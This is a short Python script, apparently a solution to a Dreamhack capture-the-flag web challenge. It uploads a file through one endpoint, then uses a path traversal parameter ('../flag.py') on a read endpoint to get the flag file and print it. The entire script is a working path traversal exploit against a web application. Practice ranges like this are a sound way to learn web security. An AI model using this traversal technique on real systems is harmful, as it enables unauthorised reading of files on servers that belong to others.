import requests

url = "http://host3.dreamhack.games:12877//upload"
payload = "http://host3.dreamhack.games:12877//read?name=../flag.py"

res = requests.post(url,data={'filename':'flag.py','content':'hello'})
res = requests.get(payload)
print(res.text)